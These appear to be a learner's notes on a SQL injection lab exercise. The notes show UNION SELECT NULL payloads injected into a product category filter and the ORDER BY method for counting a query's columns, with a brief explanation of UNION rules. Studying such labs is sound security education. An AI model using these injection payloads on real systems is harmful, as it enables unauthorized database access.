
## End goal: determine the no of column returned by the query by sql injection union attack that returns and addition row containing null values



## Burp suite

GET /filter?category=Gifts HTTP/2

## guessed query
select ? from table where category = 'gifts'


## payload

gifts ' union select null ,null ..... (until no error)


select ? from table where category = 'gifts`' union select null , null ... --` '


when entered 3 nulls we got 200 response , thus the number of column = 3



---
----
Extra note

we can find the number of column using order by method
for example
order by 1 
order by 2 
order by 3
and so

on above query , the 500 response returned by the query - 1 is the number of column



SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5

Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible

SQLi attack (way #1):

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3